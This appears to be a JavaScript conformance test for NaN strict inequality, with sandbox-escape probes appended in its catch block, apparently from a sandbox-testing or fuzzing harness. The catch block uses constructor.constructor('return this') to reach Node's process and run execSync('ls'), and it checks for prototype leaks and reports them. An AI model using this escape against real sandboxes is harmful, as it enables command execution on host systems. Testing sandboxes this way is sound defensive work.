try {
    if (!(true !== Number.NaN)) {
        $ERROR('#1: true !== NaN');
    }
    if (!(-1 !== Number.NaN)) {
        $ERROR('#2: -1 !== NaN');
    }
    if (!(Number.NaN !== Number.NaN)) {
        $ERROR('#3: NaN !== NaN');
    }
    if (!(Number.POSITIVE_INFINITY !== Number.NaN)) {
        $ERROR('#4: +Infinity !== NaN');
    }
    if (!(Number.NEGATIVE_INFINITY !== Number.NaN)) {
        $ERROR('#5: -Infinity !== NaN');
    }
    if (!(Number.MAX_VALUE !== Number.NaN)) {
        $ERROR('#6: Number.MAX_VALUE !== NaN');
    }
    if (!(Number.MIN_VALUE !== Number.NaN)) {
        $ERROR('#7: Number.MIN_VALUE !== NaN');
    }
    if (!('string' !== Number.NaN)) {
        $ERROR('#8: "string" !== NaN');
    }
    if (!(new Object() !== Number.NaN)) {
        $ERROR('#9: new Object() !== NaN');
    }
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}